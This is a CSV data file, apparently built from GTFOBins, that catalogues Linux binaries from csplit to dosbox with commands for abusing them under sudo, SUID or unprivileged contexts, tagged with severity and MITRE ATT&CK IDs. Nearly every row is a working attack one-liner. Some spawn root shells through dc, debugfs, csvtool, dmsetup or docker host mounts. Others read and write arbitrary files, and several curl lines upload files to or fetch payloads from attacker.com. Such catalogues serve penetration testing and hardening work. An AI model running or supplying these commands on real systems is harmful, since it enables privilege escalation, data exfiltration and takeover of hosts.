345,Linux,echo DATA >/path/to/temp-file csplit -z -b '%doutput-file' /path/to/temp-file 1,"Abuse the 'csplit' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. Writes the data to `xx0output-file` in the current working directory. If needed, a different prefix can be specified with `-f` (instead of `xx`).",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/csplit/
346,Linux,csvtool trim t /path/to/input-file,Abuse the 'csvtool' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is actually parsed and manipulated as CSV.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/csvtool/
347,Linux,csvtool trim t /path/to/input-file,Abuse the 'csvtool' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is actually parsed and manipulated as CSV.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/csvtool/
348,Linux,csvtool trim t /path/to/input-file,Abuse the 'csvtool' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is actually parsed and manipulated as CSV.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/csvtool/
349,Linux,echo DATA >/path/to/temp-file csvtool trim t /path/to/temp-file -o /path/to/output-file,Abuse the 'csvtool' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The file is actually parsed and manipulated as CSV.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/csvtool/
350,Linux,echo DATA >/path/to/temp-file csvtool trim t /path/to/temp-file -o /path/to/output-file,Abuse the 'csvtool' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. The file is actually parsed and manipulated as CSV.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/csvtool/
351,Linux,echo DATA >/path/to/temp-file csvtool trim t /path/to/temp-file -o /path/to/output-file,Abuse the 'csvtool' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is actually parsed and manipulated as CSV.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/csvtool/
352,Linux,csvtool call '/bin/sh;false' /etc/hosts,Abuse the 'csvtool' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/csvtool/
353,Linux,csvtool call '/bin/sh;false' /etc/hosts,Abuse the 'csvtool' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/csvtool/
354,Linux,csvtool call '/bin/sh;false' /etc/hosts,Abuse the 'csvtool' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/csvtool/
355,Linux,"ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x","Abuse the 'ctr' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. An image must be already present, for example: ``` ctr images pull docker.io/library/alpine:latest ```",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ctr/
356,Linux,"ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x","Abuse the 'ctr' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. An image must be already present, for example: ``` ctr images pull docker.io/library/alpine:latest ```",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/ctr/
357,Linux,cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file,Abuse the 'cupsfilter' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/cupsfilter/
358,Linux,cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file,Abuse the 'cupsfilter' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/cupsfilter/
359,Linux,cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file,Abuse the 'cupsfilter' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/cupsfilter/
360,Linux,curl http://attacker.com/path/to/input-file -o /path/to/output-file,Abuse the 'curl' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/curl/
361,Linux,curl http://attacker.com/path/to/input-file -o /path/to/output-file,Abuse the 'curl' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/curl/
362,Linux,curl http://attacker.com/path/to/input-file -o /path/to/output-file,Abuse the 'curl' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/curl/
363,Linux,curl file:///path/to/input-file,Abuse the 'curl' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/curl/
364,Linux,curl file:///path/to/input-file,Abuse the 'curl' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/curl/
365,Linux,curl file:///path/to/input-file,Abuse the 'curl' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/curl/
366,Linux,echo DATA >/path/to/temp-file curl file:///path/to/temp-file -o /path/to/output-file,Abuse the 'curl' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/curl/
367,Linux,echo DATA >/path/to/temp-file curl file:///path/to/temp-file -o /path/to/output-file,Abuse the 'curl' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/curl/
368,Linux,echo DATA >/path/to/temp-file curl file:///path/to/temp-file -o /path/to/output-file,Abuse the 'curl' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/curl/
369,Linux,curl --engine /path/to/lib.so x,Abuse the 'curl' binary (library load) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/curl/
370,Linux,curl --engine /path/to/lib.so x,Abuse the 'curl' binary (library load) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/curl/
371,Linux,curl --engine /path/to/lib.so x,Abuse the 'curl' binary (library load) in a unprivileged context to escalate privileges or execute arbitrary actions.,Library Load Hijack,Medium,T1574.006,https://gtfobins.github.io/gtfobins/curl/
372,Linux,curl -X POST --data-binary @/path/to/input-file http://attacker.com,Abuse the 'curl' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/curl/
373,Linux,curl -X POST --data-binary @/path/to/input-file http://attacker.com,Abuse the 'curl' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/curl/
374,Linux,curl -X POST --data-binary @/path/to/input-file http://attacker.com,Abuse the 'curl' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/curl/
375,Linux,curl -X POST --data-binary DATA http://attacker.com,Abuse the 'curl' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/curl/
376,Linux,curl -X POST --data-binary DATA http://attacker.com,Abuse the 'curl' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/curl/
377,Linux,curl -X POST --data-binary DATA http://attacker.com,Abuse the 'curl' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/curl/
378,Linux,curl gopher://attacker.com:12345/_DATA,Abuse the 'curl' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions. Data will be `\r\n` terminated.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/curl/
379,Linux,curl gopher://attacker.com:12345/_DATA,Abuse the 'curl' binary (upload) in a suid context to escalate privileges or execute arbitrary actions. Data will be `\r\n` terminated.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/curl/
380,Linux,curl gopher://attacker.com:12345/_DATA,Abuse the 'curl' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions. Data will be `\r\n` terminated.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/curl/
381,Linux,cut -d '' -f1 /path/to/input-file,Abuse the 'cut' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/cut/
382,Linux,cut -d '' -f1 /path/to/input-file,Abuse the 'cut' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/cut/
383,Linux,cut -d '' -f1 /path/to/input-file,Abuse the 'cut' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/cut/
384,Linux,dash -c 'echo DATA >/path/to/output-file',Abuse the 'dash' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/dash/
385,Linux,dash -c 'echo DATA >/path/to/output-file',Abuse the 'dash' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/dash/
386,Linux,dash -c 'echo DATA >/path/to/output-file',Abuse the 'dash' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/dash/
387,Linux,dash,Abuse the 'dash' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/dash/
388,Linux,dash,Abuse the 'dash' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/dash/
389,Linux,dash,Abuse the 'dash' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/dash/
390,Linux,date -f /path/to/input-file,Abuse the 'date' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Each line is corrupted by a prefix string and wrapped inside quotes.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/date/
391,Linux,date -f /path/to/input-file,Abuse the 'date' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Each line is corrupted by a prefix string and wrapped inside quotes.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/date/
392,Linux,date -f /path/to/input-file,Abuse the 'date' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Each line is corrupted by a prefix string and wrapped inside quotes.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/date/
393,Linux,dc -e '!/bin/sh',Abuse the 'dc' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/dc/
394,Linux,dc -e '!/bin/sh',Abuse the 'dc' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/dc/
395,Linux,dc -e '!/bin/sh',Abuse the 'dc' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/dc/
396,Linux,dd if=/path/to/input-file,Abuse the 'dd' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/dd/
397,Linux,dd if=/path/to/input-file,Abuse the 'dd' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/dd/
398,Linux,dd if=/path/to/input-file,Abuse the 'dd' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/dd/
399,Linux,echo DATA | dd of=/path/to/output-file,Abuse the 'dd' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/dd/
400,Linux,echo DATA | dd of=/path/to/output-file,Abuse the 'dd' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/dd/
401,Linux,echo DATA | dd of=/path/to/output-file,Abuse the 'dd' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/dd/
402,Linux,debugfs !/bin/sh,Abuse the 'debugfs' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/debugfs/
403,Linux,debugfs !/bin/sh,Abuse the 'debugfs' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/debugfs/
404,Linux,debugfs !/bin/sh,Abuse the 'debugfs' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/debugfs/
405,Linux,dhclient -sf /bin/sh,Abuse the 'dhclient' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/dhclient/
406,Linux,dhclient -sf /bin/sh,Abuse the 'dhclient' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/dhclient/
407,Linux,dialog --textbox /path/to/input-file 0 0,Abuse the 'dialog' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is shown in an interactive TUI dialog.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/dialog/
408,Linux,dialog --textbox /path/to/input-file 0 0,Abuse the 'dialog' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is shown in an interactive TUI dialog.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/dialog/
409,Linux,dialog --textbox /path/to/input-file 0 0,Abuse the 'dialog' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is shown in an interactive TUI dialog.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/dialog/
410,Linux,diff --line-format=%L /dev/null /path/to/input-file,Abuse the 'diff' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/diff/
411,Linux,diff --line-format=%L /dev/null /path/to/input-file,Abuse the 'diff' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/diff/
412,Linux,diff --line-format=%L /dev/null /path/to/input-file,Abuse the 'diff' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/diff/
413,Linux,diff --recursive /path/to/empty-dir /path/to/input-dir/,"Abuse the 'diff' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. This lists the content of a directory. `/path/to/empty-dir` can be any directory, but for convenience it is better to use an empty directory to avoid noise output.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/diff/
414,Linux,diff --recursive /path/to/empty-dir /path/to/input-dir/,"Abuse the 'diff' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. This lists the content of a directory. `/path/to/empty-dir` can be any directory, but for convenience it is better to use an empty directory to avoid noise output.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/diff/
415,Linux,diff --recursive /path/to/empty-dir /path/to/input-dir/,"Abuse the 'diff' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. This lists the content of a directory. `/path/to/empty-dir` can be any directory, but for convenience it is better to use an empty directory to avoid noise output.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/diff/
416,Linux,dig -f /path/to/input-file,Abuse the 'dig' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/dig/
417,Linux,dig -f /path/to/input-file,Abuse the 'dig' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/dig/
418,Linux,dig -f /path/to/input-file,Abuse the 'dig' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/dig/
419,Linux,distcc /bin/sh,Abuse the 'distcc' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/distcc/
420,Linux,distcc /bin/sh -p,Abuse the 'distcc' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/distcc/
421,Linux,distcc /bin/sh,Abuse the 'distcc' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/distcc/
422,Linux,dmesg -rF /path/to/input-file,Abuse the 'dmesg' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/dmesg/
423,Linux,dmesg -rF /path/to/input-file,Abuse the 'dmesg' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/dmesg/
424,Linux,dmesg -rF /path/to/input-file,Abuse the 'dmesg' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/dmesg/
425,Linux,dmesg -H,Abuse the 'dmesg' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/dmesg/
426,Linux,dmesg -H,Abuse the 'dmesg' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/dmesg/
427,Linux,dmesg -H,Abuse the 'dmesg' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/dmesg/
428,Linux,dmidecode --no-sysfs -d x.dmi --dump-bin /path/to/output-file,"Abuse the 'dmidecode' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. It can be used to write files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode. Generate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target. - `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes. - `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option. ``` make dmiwrite echo DATA >/path/to/temp-file ./dmiwrite /path/to/temp-file x.dmi ```",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/dmidecode/
429,Linux,dmsetup create base <<EOF 0 3534848 linear /dev/loop0 94208 EOF dmsetup ls --exec '/bin/sh -s',Abuse the 'dmsetup' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/dmsetup/
430,Linux,dmsetup create base <<EOF 0 3534848 linear /dev/loop0 94208 EOF dmsetup ls --exec '/bin/sh -p -s',Abuse the 'dmsetup' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/dmsetup/
431,Linux,dmsetup create base <<EOF 0 3534848 linear /dev/loop0 94208 EOF dmsetup ls --exec '/bin/sh -s',Abuse the 'dmsetup' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/dmsetup/
432,Linux,dnf install -y x-1.0-1.noarch.rpm --disablerepo=*,"Abuse the 'dnf' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` echo /path/to/command >x.sh fpm -n x -s dir -t rpm -a all --before-install x.sh . ``` The `--disablerepo=*` option is used for targets without Internet connectivity, can be omitted otherwise.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/dnf/
433,Linux,dnsmasq --conf-script='/path/to/command 1>&2',Abuse the 'dnsmasq' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/dnsmasq/
434,Linux,dnsmasq --conf-script='/path/to/command 1>&2',Abuse the 'dnsmasq' binary (command) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/dnsmasq/
435,Linux,dnsmasq --conf-script='/path/to/command 1>&2',Abuse the 'dnsmasq' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/dnsmasq/
436,Linux,doas -u root /bin/sh,Abuse the 'doas' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The user must be allowed to use `doas`.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/doas/
437,Linux,doas -u root /bin/sh,Abuse the 'doas' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The user must be allowed to use `doas`.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/doas/
438,Linux,docker cp /path/to/input-file $CONTAINER_ID:input-file docker cp $CONTAINER_ID:input-file /path/to/temp-file cat /path/to/temp-file,Abuse the 'docker' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Read a file by copying it to a temporary container (`$CONTAINER_ID`) and back to a new location on the host.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/docker/
439,Linux,docker cp /path/to/input-file $CONTAINER_ID:input-file docker cp $CONTAINER_ID:input-file /path/to/temp-file cat /path/to/temp-file,Abuse the 'docker' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Read a file by copying it to a temporary container (`$CONTAINER_ID`) and back to a new location on the host.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/docker/
440,Linux,docker cp /path/to/input-file $CONTAINER_ID:input-file docker cp $CONTAINER_ID:input-file /path/to/temp-file cat /path/to/temp-file,Abuse the 'docker' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Read a file by copying it to a temporary container (`$CONTAINER_ID`) and back to a new location on the host.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/docker/
441,Linux,echo DATA >/path/to/temp-file docker cp /path/to/temp-file $CONTAINER_ID:temp-file docker cp $CONTAINER_ID /path/to/output-file,Abuse the 'docker' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. Write a file by copying it to a temporary container (`$CONTAINER_ID`) and back to the target destination on the host.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/docker/
442,Linux,echo DATA >/path/to/temp-file docker cp /path/to/temp-file $CONTAINER_ID:temp-file docker cp $CONTAINER_ID /path/to/output-file,Abuse the 'docker' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. Write a file by copying it to a temporary container (`$CONTAINER_ID`) and back to the target destination on the host.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/docker/
443,Linux,echo DATA >/path/to/temp-file docker cp /path/to/temp-file $CONTAINER_ID:temp-file docker cp $CONTAINER_ID /path/to/output-file,Abuse the 'docker' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. Write a file by copying it to a temporary container (`$CONTAINER_ID`) and back to the target destination on the host.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/docker/
444,Linux,docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh,Abuse the 'docker' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/docker/
445,Linux,docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh,Abuse the 'docker' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/docker/
446,Linux,docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh,Abuse the 'docker' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/docker/
447,Linux,docker run --rm -it --privileged -u root alpine mount /dev/sda1 /mnt/ ls -la /mnt/ chroot /mnt /bin/bash,"Abuse the 'docker' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. This exploits the fact that is run with the `--privileged` option to directly mount a host's disk, e.g., `/dev/sda1`.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/docker/
448,Linux,docker run --rm -it --privileged -u root alpine mount /dev/sda1 /mnt/ ls -la /mnt/ chroot /mnt /bin/bash,"Abuse the 'docker' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. This exploits the fact that is run with the `--privileged` option to directly mount a host's disk, e.g., `/dev/sda1`.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/docker/
449,Linux,docker run --rm -it --privileged -u root alpine mount /dev/sda1 /mnt/ ls -la /mnt/ chroot /mnt /bin/bash,"Abuse the 'docker' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This exploits the fact that is run with the `--privileged` option to directly mount a host's disk, e.g., `/dev/sda1`.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/docker/
450,Linux,dos2unix -f -O /path/to/input-file,Abuse the 'dos2unix' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/dos2unix/
451,Linux,dos2unix -f -O /path/to/input-file,Abuse the 'dos2unix' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/dos2unix/
452,Linux,dos2unix -f -O /path/to/input-file,Abuse the 'dos2unix' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/dos2unix/
453,Linux,dos2unix -f -n /path/to/input-file /path/to/output-file,Abuse the 'dos2unix' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/dos2unix/
454,Linux,dos2unix -f -n /path/to/input-file /path/to/output-file,Abuse the 'dos2unix' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/dos2unix/
455,Linux,dos2unix -f -n /path/to/input-file /path/to/output-file,Abuse the 'dos2unix' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/dos2unix/
456,Linux,dosbox -c 'mount c /' -c 'type c:\path\to\input',Abuse the 'dosbox' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file content will be displayed in the DOSBox graphical window.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/dosbox/
457,Linux,dosbox -c 'mount c /' -c 'type c:\path\to\input',Abuse the 'dosbox' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file content will be displayed in the DOSBox graphical window.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/dosbox/
458,Linux,dosbox -c 'mount c /' -c 'type c:\path\to\input',Abuse the 'dosbox' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file content will be displayed in the DOSBox graphical window.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/dosbox/
459,Linux,dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit cat /path/to/OUTPUT,Abuse the 'dosbox' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is copied to a readable location.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/dosbox/
460,Linux,dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit cat /path/to/OUTPUT,Abuse the 'dosbox' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is copied to a readable location.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/dosbox/
